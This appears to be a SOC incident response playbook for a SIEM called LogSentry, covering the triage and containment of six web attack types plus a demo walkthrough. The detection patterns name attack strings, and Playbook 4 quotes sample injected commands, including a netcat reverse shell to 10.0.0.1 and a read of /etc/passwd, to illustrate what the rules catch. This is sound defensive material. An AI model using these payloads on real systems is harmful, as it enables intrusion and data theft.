# LogSentry v1.0.0 — Enterprise SOC Incident Response Playbooks & Operational Guide

**Document Version:** 1.0.0  
**Status:** Official Security Operations Center (SOC) Standard Operating Procedure (SOP)  
**Classification:** Internal Security Operations Documentation  
**Framework Alignment:** NIST SP 800-61r2, MITRE ATT&CK® v14, SANS Incident Response Lifecycle  

---

## SECTION 1: DOCUMENT PURPOSE & SCOPE

### 1.1 Purpose
This document establishes formal Security Operations Center (SOC) Standard Operating Procedures (SOPs) and Incident Response Playbooks for security events detected, analyzed, and managed within the **LogSentry Enterprise SIEM platform**. It defines how SOC analysts must operationalize LogSentry's existing detection capabilities, forensic audit trails, AI SOC Analyst containment strategies, and incident workflows to investigate and remediate security threats.

### 1.2 Scope
This operational guide applies to all SOC Level 1 (Triage), Level 2 (Investigation), and Level 3 (Incident Response) analysts operating the LogSentry platform. It covers LogSentry's six core detection categories:
1. **SQL Injection (`sqli`)**
2. **Cross-Site Scripting (`xss`)**
3. **Path Traversal (`path_traversal`)**
4. **Command Injection (`cmd_injection`)**
5. **Directory Enumeration (`dir_enum`)**
6. **Brute Force Authentication (`brute_force`)**

---

## SECTION 2: LOGSENTRY INCIDENT RESPONSE ARCHITECTURE

### 2.1 Architectural Overview
LogSentry is an end-to-end SIEM and threat investigation platform built on a modular architecture:
```
+------------------+     +-------------------+     +-------------------------+
| Log Ingestion    | --> | Detection Engine  | --> | DetectionAlert          |
| (Apache, Nginx,  |     | (Regex &          |     | (Evidence, Raw Log,     |
|  JSON, Syslog)   |     |  Behavioral Rules)|     |  MITRE, Risk Score)     |
+------------------+     +-------------------+     +-------------------------+
                                                               |
                                                               v
+------------------+     +-------------------+     +-------------------------+
| Incident Manager | <-- | AI SOC Analyst    | <-- | Threat Intel Enrichment |
| (Lifecycle,      |     | (Containment      |     | (AbuseIPDB, OTX,        |
|  Timeline Audit) |     |  Strategy, LLM)   |     |  GeoIP, MITRE ATT&CK)   |
+------------------+     +-------------------+     +-------------------------+
```

### 2.2 Operational Separation of Responsibilities
To maintain architectural precision, LogSentry enforces a strict distinction between automated SIEM processing, advisory SIEM guidance, and manual analyst execution:

| Responsibility Type | Executed By | Scope & Description |
| :--- | :--- | :--- |
| **Automated SIEM Actions** | **LogSentry Platform** | Log ingestion, parser normalization, detection rule evaluation, alert generation, Threat Intelligence enrichment (AbuseIPDB/OTX/GeoIP), MITRE ATT&CK mapping, and timeline logging. |
| **Advisory SIEM Recommendations** | **LogSentry Platform (AI & Rule Engine)** | Rule-level static recommendations, AI SOC Analyst executive summaries, attack chain reconstructions, and prioritized `containment_strategy` action steps. |
| **Manual Analyst Remediation** | **SOC Analyst / Host Admin** | Firewall IP blocking, WAF rule modifications, server process termination, network isolation, credential revocation, DB query sanitization, and OS patch deployment on affected infrastructure. |

---

## SECTION 3: CORE INCIDENT RESPONSE WORKFLOWS

### 3.1 Incident Lifecycle Workflows
LogSentry implements an explicit five-stage incident lifecycle (`IncidentModel`, `app/models/incident.py`):

```
[ OPEN ] ---> [ INVESTIGATING ] ---> [ CONTAINED ] ---> [ RESOLVED ] ---> [ CLOSED ]
```

1. **`OPEN`**: The incident has been created manually or correlated from detection alerts. It is awaiting initial analyst triage.
2. **`INVESTIGATING`**: An analyst has assigned ownership (`assignee`) and clicked **Start Investigation**. The team is analyzing root cause, payload logs, and AI containment recommendations.
3. **`CONTAINED`**: The analyst has manually executed external containment steps (e.g., firewall blocklists, account disablement) on the target infrastructure and updated status to **Contain**.
4. **`RESOLVED`**: Eradication and recovery are complete. The analyst has recorded resolution notes and clicked **Resolve**.
5. **`CLOSED`**: Post-incident review is finished. The incident is archived as **Closed**.

### 3.2 Alert-to-Incident Correlation Workflow
1. When an alert fires in `frontend/src/pages/Alerts.tsx`, analysts review the **Summary**, **Evidence**, and **Original Payload** tabs.
2. If the alert represents an active, multi-stage attack or requires collaborative investigation, the analyst creates a formal Incident via `frontend/src/pages/Incidents.tsx`.
3. Multiple detection alerts can be linked to a single Incident via the many-to-many alert association table (`incident_alert_association`), consolidating forensic data across multiple rules and source IPs into one workspace.

### 3.3 Role of LogSentry Threat Intelligence
When an alert is generated, LogSentry automatically enriches the source IP via `EnrichmentService` (`app/services/enrichment_service.py`):
* **AbuseIPDB Provider (`AbuseIPDBProvider`)**: Queries IP reputation, abuse confidence score, and historical reports.
* **AlienVault OTX Provider (`OTXProvider`)**: Identifies associated pulse names and threat pulses.
* **GeoIP Provider (`GeoIPProvider`)**: Locates the country, city, and ASN of the attacker IP.
* *Analyst Operational Rule:* Analysts must check the **Threat Intel** tab in the Alert Drawer to determine if the source IP is a known global scanner or a targeted attacker.

### 3.4 Role of MITRE ATT&CK® Mapping
LogSentry maps detection rules to MITRE ATT&CK techniques via `MitreProvider` (`app/enrichment/providers/mitre_provider.py`) using the following supported dictionary (`MITRE_MAPPING`):
* **`T1190`**: Exploit Public-Facing Application (*Initial Access*)
* **`T1505`**: Server Software Component (*Persistence*)
* **`T1059`**: Command and Scripting Interpreter (*Execution*)
* **`T1110`**: Brute Force (*Credential Access*)
* **`T1083`**: File and Directory Discovery (*Discovery*)

### 3.5 Role of the AI SOC Analyst
Analysts can invoke the AI SOC Analyst (`AIService`, `app/services/ai_service.py`), which submits the alert payload, evidence, and enrichment context to a configured LLM provider (OpenAI, Gemini, or Ollama) and returns a structured `AIAnalysisResponse` (`app/ai/models.py`).

#### AI-Generated `containment_strategy` and `recommended_actions`
* **`recommended_actions` (String):** High-level SOC remediation advice and severity justifications.
* **`containment_strategy` (List[`ContainmentAction`]):** A structured list containing:
  * **`priority`**: `Immediate`, `High`, `Medium`, or `Low`.
  * **`action`**: Concrete containment step (e.g., *"Block source IP at edge firewall"*).
  * **`reason`**: Technical justification for the step.
* *Important Distinction:* The AI SOC Analyst *advises* containment actions; it **does not** automatically execute network blocks or host commands.

### 3.6 Incident Timeline & Forensic Audit Trail
Every incident maintains an immutable audit log (`TimelineEventModel`, `app/models/timeline.py`). The repository automatically records:
* `action: "created"` — Timestamp and initial metadata when the incident is opened.
* `action: "status_changed"` — Records transitions (e.g., `open` → `investigating`) with `old_value` and `new_value`.
* `action: "assigned"` — Records analyst ownership changes.
* `action: "commented"` — Records analyst investigation notes and collaboration comments.
* `action: "alert_added"` — Records when additional alerts are correlated into the incident.

### 3.7 Severity and P1–P4 Priority Handling
* **Severity (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`)**: Defined automatically by the detection rule based on potential impact.
* **Priority (`P1`, `P2`, `P3`, `P4`)**: Assigned by the SOC analyst during incident triage to dictate SLA response times:
  * **P1 (Critical SLA - 15m)**: Active remote code execution (`cmd_injection`), confirmed data exfiltration, or production outage.
  * **P2 (High SLA - 1h)**: Active SQL injection (`sqli`), brute force authentication bursts (`brute_force`), or path traversal (`path_traversal`).
  * **P3 (Medium SLA - 4h)**: Stored/Reflected XSS attempts (`xss`) or directory reconnaissance (`dir_enum`).
  * **P4 (Low SLA - 24h)**: Isolated scanning probes or benign false positives.

### 3.8 Analyst Comments & Investigation Documentation
Analysts must document all investigation findings directly in the Incident Drawer (`frontend/src/pages/Incidents.tsx`). Every comment is persisted to the database and stamped into the forensic timeline, ensuring audit readiness during compliance reviews.

### 3.9 False-Positive Classification
If an alert is triggered by benign activity, the analyst clicks **False Positive** in the Alert Drawer (`frontend/src/pages/Alerts.tsx`), selects a structured classification reason, and provides mandatory analyst notes:
* `Incorrect Detection` — Regex/threshold triggered on non-malicious syntax.
* `Expected Behavior` — Standard administrative or application workflow.
* `Authorized Security Testing` — Scheduled vulnerability scans or penetration testing.
* `Internal Vulnerability Scan` — Activity from approved internal scanner IPs.
* `Whitelisted Activity` — Known trusted system automation.

### 3.10 Evidence Preservation Guidelines
1. **Raw Log Preservation:** Never delete original raw logs. The `alert.raw_log_reference` field stores the exact unparsed HTTP payload.
2. **Evidence Dictionary Export:** Use the UI **Copy JSON** button in the Evidence tab to export parsed fields (`unique_paths_probed`, `sample_paths`, `source_ip`, `window_seconds`) to offline forensic vaults.
3. **Timeline Export:** Generate an official Incident Report (PDF/CSV/JSON via `app/reports/`) to freeze the forensic audit trail before closing an incident.

### 3.11 Incident Closure Criteria & Post-Incident Review
An incident may be transitioned to **`CLOSED`** only when:
1. All associated alerts have been investigated and resolved.
2. Target infrastructure has been patched or hardened against re-exploitation.
3. A formal Post-Incident Review (PIR) note is entered in the timeline detailing root cause, containment effectiveness, and rule tuning recommendations.

---

## SECTION 4: CATEGORY-SPECIFIC INCIDENT RESPONSE PLAYBOOKS

---

### PLAYBOOK 1: SQL INJECTION (`sqli`)

#### 1. Purpose & Scope
Provides standard operating procedures for investigating and remediating SQL Injection attacks targeting web application query parameters, headers, or forms.

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `SQLInjectionRule` (`app/detection/rules/sqli.py`)
* **Rule Version:** `1.1.0`
* **Pattern:** `r'(?i)(UNION\s+SELECT|OR\s+1=1|DROP\s+TABLE|SLEEP\(|information_schema)'`
* **Evaluation:** Matches against `event.endpoint` in any HTTP request.

#### 3. Expected LogSentry Alert
* **Title:** `SQL Injection Attempt Detected`
* **Severity:** `HIGH`
* **Risk Score:** `85.0 / 100`
* **MITRE Technique:** `T1190` (*Exploit Public-Facing Application* — *Initial Access*)
* **Built-in Recommendation:** `"Sanitize database inputs and use parameterized queries."`

#### 4. Identification & Initial Triage
1. Open Alert Drawer in LogSentry UI → navigate to **Original Payload** tab.
2. Inspect `endpoint` and query string for SQL operators (`UNION SELECT`, `OR 1=1`, `SLEEP()`).
3. Check the HTTP response status code in `alert.evidence`:
   * **`200 OK` or `500 Internal Server Error`**: Highly suspicious; suggests the query reached the database engine.
   * **`403 Forbidden` or `400 Bad Request`**: Suggests WAF or input validation blocked the request.

#### 5. Investigation Procedure
1. **Threat Intel Lookup:** Check AbuseIPDB score in the Alert Drawer.
2. **Correlate IP History:** Search LogSentry for all historical events from `event.source_ip`.
3. **Database Log Audit (Manual Action):** Check target DB server audit logs to verify if unauthorized syntax executed or schema tables (`information_schema`) were accessed.

#### 6. Evidence to Collect
* Complete `alert.raw_log_reference` line.
* Database error log timestamps corresponding to `alert.timestamp`.
* List of DB accounts active during the attack window.

#### 7. Containment Procedure
* **Automated by LogSentry:** Generates Alert, maps MITRE T1190, logs evidence.
* **Recommended by LogSentry (AI Strategy):** Suggests IP block and parameter sanitization.
* **Manual Analyst Execution:**
  1. Apply an immediate temporary block on `source_ip` at the edge firewall or WAF.
  2. If database breach is confirmed, revoke/rotate credentials for the affected DB connection string.

#### 8. Eradication & Recovery (Manual Analyst Actions)
1. Review vulnerable application code; replace dynamic SQL concatenation with parameterized prepared statements.
2. Ensure database user account operates under strict Principle of Least Privilege (no `DROP` or `ADMIN` rights on web application DB accounts).

#### 9. Validation & PIR
* Re-scan the endpoint using an authorized DAST scanner to confirm parameterization.
* Verify 0 new SQLi alerts from the source IP after WAF policy update.

---

### PLAYBOOK 2: CROSS-SITE SCRIPTING (`xss`)

#### 1. Purpose & Scope
Provides SOPs for triaging Cross-Site Scripting (Reflected, Stored, or DOM) injection attempts across web endpoints.

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `XSSRule` (`app/detection/rules/xss.py`)
* **Rule Version:** `1.1.0`
* **Pattern:** `r'(?i)(<script>|javascript:|onerror=|alert\(|document\.cookie)'`

#### 3. Expected LogSentry Alert
* **Title:** `Cross-Site Scripting (XSS) Detected`
* **Severity:** `MEDIUM`
* **Risk Score:** `60.0 / 100`
* **MITRE Technique:** `T1190` (*Exploit Public-Facing Application* — *Initial Access*)
* **Built-in Recommendation:** `"Encode user input on output and implement strict Content Security Policy (CSP)."`

#### 4. Identification & Initial Triage
1. Inspect the string in `alert.endpoint` (e.g., `<script>alert(1)</script>` or `<img src=x onerror=...>`).
2. Identify if the parameter is reflected in search bars, contact forms, or profile fields.

#### 5. Investigation Procedure
1. Check if the payload targets an administrative endpoint (`/admin`, `/dashboard`).
2. Review web server access logs to determine if authenticated users visited the crafted URL (Reflected XSS) or if the payload was stored in the database (Stored XSS).

#### 6. Containment & Eradication (Manual Analyst Actions)
* **Containment:** If Stored XSS is confirmed, take the affected page offline or purge the injected record from the database.
* **Eradication:**
  1. Implement context-aware HTML/JavaScript entity encoding on application output.
  2. Enforce a restrictive `Content-Security-Policy` (CSP) HTTP header (e.g., `default-src 'self'; script-src 'self'`).
  3. Enforce `HttpOnly` and `Secure` flags on all session cookies.

---

### PLAYBOOK 3: PATH / DIRECTORY TRAVERSAL (`path_traversal`)

#### 1. Purpose & Scope
Provides SOPs for detecting and containing arbitrary file read attempts trying to escape web root directories.

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `PathTraversalRule` (`app/detection/rules/path_traversal.py`)
* **Rule Version:** `1.1.0`
* **Pattern:** `r'(?i)(\.\./|\.\.\\|%2e%2e|/etc/passwd|c:\\windows\\)'`

#### 3. Expected LogSentry Alert
* **Title:** `Path Traversal Attempt`
* **Severity:** `HIGH`
* **Risk Score:** `75.0 / 100`
* **MITRE Technique:** `T1190` (*Exploit Public-Facing Application* — *Initial Access*)
* **Built-in Recommendation:** `"Normalize file paths before accessing system files. Prevent accessing paths outside the web root."`

#### 4. Identification & Investigation
1. Examine `alert.endpoint` for directory escape sequences (`../`, `..%2f`, `/etc/passwd`).
2. Verify HTTP status code and response content length:
   * A `200 OK` with a non-zero response body length indicates potential successful file exfiltration.
3. Check if the application process runs as `root` or an administrative user.

#### 5. Containment & Remediation (Manual Analyst Actions)
* **Containment:** Block `source_ip` on firewall.
* **Remediation:**
  1. Restrict application file download APIs to an explicit whitelist of safe filenames.
  2. Implement path normalization and reject any input containing directory separators (`/`, `\`, `..`).
  3. Ensure the web server process runs as a low-privileged system user (`www-data`).

---

### PLAYBOOK 4: OS COMMAND INJECTION (`cmd_injection`)

#### 1. Purpose & Scope
Provides immediate emergency response procedures for handling OS Command Injection attempts aimed at Remote Code Execution (RCE).

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `CommandInjectionRule` (`app/detection/rules/cmd_injection.py`)
* **Rule Version:** `1.1.0`
* **Pattern:** `r'(?i)(;|&&|\|\||\||\$\(\s*.*?\)|\`.*?\`|wget|curl|nc\s)'`

#### 3. Expected LogSentry Alert
* **Title:** `OS Command Injection Attempt`
* **Severity:** `CRITICAL`
* **Risk Score:** `95.0 / 100`
* **MITRE Technique:** `T1059` (*Command and Scripting Interpreter* — *Execution*)
* **Built-in Recommendation:** `"Avoid calling OS commands directly. If necessary, use safe APIs and strictly validate arguments."`

#### 4. Emergency Identification & Triage (P1 CRITICAL)
1. **IMMEDIATE ACTION:** Create a `CRITICAL` priority Incident in LogSentry (`P1`); assign senior IR analyst.
2. Inspect `endpoint` for shell operators (`foo; id`, `&& cat /etc/passwd`, `| nc 10.0.0.1 4444 -e /bin/sh`).

#### 5. Host Investigation (Manual Analyst Actions)
1. Inspect server operating system logs and endpoint security logs for child process spawning under the web server (`www-data` spawning `/bin/sh`, `curl`, `wget`, or `cmd.exe`).
2. Check network flow logs for unexpected outbound TCP/UDP connections (reverse shells).

#### 6. Emergency Containment & Recovery (Manual Analyst Actions)
* **Immediate Containment:**
  1. **ISOLATE THE HOST:** Immediately isolate the target web server from the internal production network (retain console/forensic access).
  2. Block the attacker IP and any outbound Command & Control (C2) IP addresses discovered in payload parameters.
* **Eradication & Recovery:**
  1. Capture memory image and preserve disk forensics of the compromised host.
  2. Rebuild the server from a clean, certified golden machine image.
  3. Replace calls to system shell execution (`system()`, `exec()`) in code with safe, memory-safe library APIs.

---

### PLAYBOOK 5: DIRECTORY ENUMERATION (`dir_enum`)

#### 1. Purpose & Scope
Provides SOPs for detecting, correlating, and blocking automated web reconnaissance and sensitive path probing.

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `DirectoryEnumerationRule` (`app/detection/rules/dir_enum.py`)
* **Rule Version:** `2.0.0` (Behavioral Threshold Engine)
* **Mechanism:** Tracks requests per `source_ip` within `DETECTION_DIR_ENUM_WINDOW_SECONDS` (default `60s`).
* **Threshold Condition:** Triggered when a single IP requests at least `DETECTION_DIR_ENUM_THRESHOLD` (default `3`) **distinct unusual/administrative paths** within the time window.
* **Benign Path & `robots.txt` Handling:**
  * Standard browsing (`/`, `/index.html`, `/login`, `/about`, `/css/*`, `.js`) is automatically ignored.
  * `GET /robots.txt` alone **never** triggers an alert, but is included in campaign `sample_paths` if part of a multi-path reconnaissance burst.

#### 3. Expected LogSentry Alert
* **Title:** `Directory Enumeration Attempt`
* **Severity:** `LOW`
* **Risk Score:** `35.0 / 100`
* **MITRE Technique:** `T1083` (*File and Directory Discovery* — *Discovery*)
* **Built-in Recommendation:** `"Monitor source IP for reconnaissance behavior. Restrict access to administrative paths and implement rate limiting."`

#### 4. Identification & Forensic Analysis
1. Open Alert Drawer → review the **Reconnaissance Campaign Evidence** card in the Evidence tab:
   * Inspect **`unique_paths_probed`**, **`request_count`**, and **`window_seconds`**.
   * Review **`sample_paths`** badges (e.g., `/.git/config`, `/.env`, `/admin`, `/wp-admin`, `/backup`).
2. Check **Original Payload** tab to view the combined raw HTTP logs from the entire burst; check User-Agent headers for known scanning tools (`gobuster`, `dirb`, `ffuf`, `Nikto`).

#### 5. Containment & Remediation (Manual Analyst Actions)
* **Containment:** Apply rate-limiting (e.g., HTTP 429 Throttle) or temporary IP block on `source_ip` at the WAF.
* **Remediation:**
  1. Ensure sensitive directories (`/.git`, `/.env`, `/backup`) return `404 Not Found` or `403 Forbidden` and are not publicly accessible.
  2. Implement progressive delay challenges or CAPTCHA on excessive 404 requests.

---

### PLAYBOOK 6: BRUTE FORCE AUTHENTICATION (`brute_force`)

#### 1. Purpose & Scope
Provides SOPs for triaging and containing credential guessing and brute force authentication campaigns.

#### 2. Detection Trigger (Repository Implementation)
* **Rule Class:** `BruteForceRule` (`app/detection/rules/brute_force.py`)
* **Rule Version:** `1.1.0` (Behavioral Threshold Engine)
* **Mechanism:** Tracks authentication failure requests (`HTTP 401` or `403` on endpoints matching `login`) per `source_ip` over `DETECTION_BRUTE_FORCE_WINDOW_SECONDS` (default `60s`).
* **Threshold Condition:** Triggered when failed login attempts reach `DETECTION_BRUTE_FORCE_THRESHOLD` (default `5`) within the time window.

#### 3. Expected LogSentry Alert
* **Title:** `Brute Force Authentication Detected`
* **Severity:** `HIGH`
* **Risk Score:** `90.0 / 100`
* **MITRE Technique:** `T1110` (*Brute Force* — *Credential Access*)
* **Built-in Recommendation:** `"Block IP temporarily or enforce rate limiting."`

#### 4. Identification & Triage
1. Review Alert Drawer Summary; verify `evidence.threshold` and `source_ip`.
2. **CRITICAL VERIFICATION:** Query LogSentry historical logs for any subsequent `HTTP 200 OK` or `302 Found` login responses from `source_ip` immediately following the burst.
   * *If an HTTP 200/302 is found:* **THE BRUTE FORCE ATTEMPT SUCCEEDED.** Escalate immediately to P1 Critical Incident.

#### 5. Containment & Eradication (Manual Analyst Actions)
* **Immediate Containment:**
  1. Block `source_ip` at the authentication gateway / firewall.
  2. If an account was compromised, immediately force session revocation and password reset for the victim user account.
* **Long-Term Eradication:**
  1. Enforce Multi-Factor Authentication (MFA) across all administrative and user login portals.
  2. Implement account lockout policies (e.g., lock account for 15 minutes after 5 consecutive failed login attempts).

---

## SECTION 5: END-TO-END INCIDENT RESPONSE DEMONSTRATION

The following step-by-step walkthrough demonstrates how an analyst operationalizes LogSentry's existing features during a live cybersecurity attack:

```
[1. Log Ingestion] -> [2. Detection] -> [3. Alert Generation] -> [4. Threat Intel]
                                                                        |
                                                                        v
[8. Incident Creation] <- [7. Alert Triage] <- [6. AI SOC Analysis] <- [5. MITRE Mapping]
         |
         v
[9. Investigation] -> [10. Containment] -> [11. Resolution] -> [12. PIR & Closure]
```

### Phase 1: Log Ingestion & Detection
1. **Ingestion:** An Apache log file (`demo_comprehensive.log`) is uploaded via `frontend/src/pages/Alerts.tsx`. The LogSentry `ApacheLogParser` parses the raw strings into normalized `LogEvent` schemas.
2. **Detection Evaluation:** The `DetectionEngine` evaluates incoming events. Source IP `10.0.1.59` probes `/admin`, `/.git/config`, `/.env`, `/.htaccess`, and `/wp-admin` within 4 seconds.
3. **Alert Generation:** `DirectoryEnumerationRule` reaches its threshold (`unique_paths = 5 >= 3`). LogSentry generates a `DetectionAlert` titled **"Directory Enumeration Attempt"** (`Severity: LOW`, `Risk Score: 35.0`).

### Phase 2: Enrichment & AI Analysis
4. **Threat Intelligence Enrichment:** LogSentry automatically queries `AbuseIPDBProvider` and `OTXProvider`. The UI Threat Intel badge highlights `10.0.1.59` with an Abuse Confidence Score of `88%` and tags it as a known scanner.
5. **MITRE ATT&CK Context:** `MitreProvider` maps the alert to **`T1083`** (*File and Directory Discovery* under Tactic *Discovery*), providing clickable references to ATT&CK documentation.
6. **AI SOC Analyst Analysis:** The analyst clicks **Analyze with AI** in the Alert Drawer. `AIService` submits the alert and enrichment payload to the LLM. The LLM returns:
   * **Executive Summary:** *"Source 10.0.1.59 is executing automated directory enumeration targeting application configuration files."*
   * **Containment Strategy:**
     * `Priority: High | Action: Enforce WAF rate limiting on 404 responses | Reason: Mitigates scanner velocity.`
     * `Priority: Immediate | Action: Block IP 10.0.1.59 at edge firewall | Reason: Prevents follow-up exploitation attempts.`

### Phase 3: Triage & Incident Correlation
7. **Alert Triage:** The analyst inspects the **Reconnaissance Campaign Evidence** card in the Evidence tab, viewing `unique_paths_probed: 5` and sample paths badges.
8. **Incident Creation:** Notice that the same IP also triggered a High-severity **SQL Injection Attempt** alert (`T1190`). The analyst navigates to **Incidents**, creates a new Incident titled **"Multi-Stage Web Recon & SQLi Campaign - IP 10.0.1.59"**, sets priority to **`P2`**, and attaches both the Directory Enumeration alert and the SQL Injection alert to the incident.

### Phase 4: Investigation & Containment
9. **Investigation & Collaboration:** In the Incident Drawer (`frontend/src/pages/Incidents.tsx`), the analyst clicks **Start Investigation** (transitioning status from `open` to `investigating`). The analyst enters a comment: *"Confirmed gobuster user-agent in raw logs; SQL injection targeted /login parameter. Initiating firewall containment."*
10. **Containment Execution:**
    * The analyst manually applies an edge firewall drop rule for IP `10.0.1.59` on the affected enterprise firewall.
    * The analyst clicks **Contain** in the LogSentry Incident Drawer (transitioning status to `contained`). The `TimelineEventModel` automatically records the status transition and timestamp.

### Phase 5: Resolution, Audit Review & Closure
11. **Eradication & Resolution:** The analyst confirms database logs show 0 successful SQL injections and verifies sensitive `.git` paths return 404 Not Found. The analyst clicks **Resolve** in the Incident Drawer.
12. **Forensic Audit Review:** The analyst opens the Incident Timeline to review the complete, immutable chronological audit trail:
    * `15:02:10` — Incident CREATED by Demo User.
    * `15:05:22` — STATUS CHANGED from `open` to `investigating`.
    * `15:08:45` — COMMENTED: *"Confirmed gobuster user-agent..."*
    * `15:11:00` — STATUS CHANGED from `investigating` to `contained`.
    * `15:25:12` — STATUS CHANGED from `contained` to `resolved`.
13. **Closure:** The analyst exports the official Incident Summary PDF report for compliance archiving and clicks **Close** to complete the incident lifecycle.

---

## SECTION 6: SUMMARY OF REPOSITORY VERIFICATION

This document was authored through direct inspection of the active LogSentry codebase:
* **Detection Rules:** Verified from `app/detection/rules/*.py`.
* **Database Models:** Verified from `app/models/incident.py`, `app/models/timeline.py`, `app/models/alert.py`.
* **Enrichment Providers:** Verified from `app/enrichment/providers/mitre_provider.py`, `abuseipdb_provider.py`, `otx_provider.py`.
* **AI Engine:** Verified from `app/services/ai_service.py` and `app/ai/models.py`.
* **Frontend Workflows:** Verified from `frontend/src/pages/Incidents.tsx` and `frontend/src/pages/Alerts.tsx`.

*No source code, architecture, or test files were modified during the creation of this operational playbook document.*
